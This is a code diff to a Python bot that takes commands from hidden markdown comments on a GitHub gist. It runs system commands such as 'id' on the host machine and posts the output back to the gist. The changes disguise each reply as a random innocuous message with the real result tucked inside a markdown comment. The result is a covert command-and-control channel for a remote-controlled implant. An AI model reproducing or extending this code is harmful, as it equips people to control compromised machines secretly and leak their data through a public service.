@@ -5,6 +5,8 @@ import requests
 from dotenv import dotenv_values
 import time
 
+from utils import create_markdown_comment, get_random_message, parse_markdown_comment
+
 parser = argparse.ArgumentParser(
     prog='bot.py',
     description='Bot script listening to commands on given gist channel'
@@ -31,9 +33,9 @@ gist_id = args.gistId
 gist_url = f'https://api.github.com/gists/{gist_id}'
 comments_url = f'{gist_url}/comments'
 
-gist_response = requests.get(gist_url)
-gist = gist_response.json()
 headers = {"authorization": f'bearer {github_token}'}
+gist_response = requests.get(gist_url, headers=headers)
+gist = gist_response.json()
 state = {"last_update": gist['updated_at']}
 
 try:
@@ -58,20 +60,18 @@ def get_latest_comments():
 
 
 def get_commands(comments):
-    def parse_command(comment: str):
-        md_comment_sign = '[//]: # ('
-        command_idx = comment.find(md_comment_sign) + len(md_comment_sign)
-        command = comment[command_idx: len(comment)-1]
-        return command
-
-    commands = map(lambda comment: parse_command(comment['body']), comments)
+    commands = map(lambda comment: parse_markdown_comment(
+        comment['body']), comments)
     return filter(lambda command: command != '', commands)
 
 
 def post_comment(message: str):
-    log(f'Sending message "{message}"')
+    comment = f'{get_random_message()}\n\n{create_markdown_comment(message)}'
+    log(f'Sending comment "{comment}"')
+
     response = requests.post(
-        comments_url, json={"body": message}, headers=headers)
+        comments_url, json={"body": comment}, headers=headers)
+
     log(response)
     state["last_update"] = response.json()['updated_at']
 
@@ -100,6 +100,8 @@ def handle_command(command: str):
         case 'id':
             result = subprocess.check_output(['id'])
             post_comment(result.decode('utf-8'))
+        case 'ping':
+            post_comment('pong')
         case _:
             log('Unknown command: '+command)
             try:
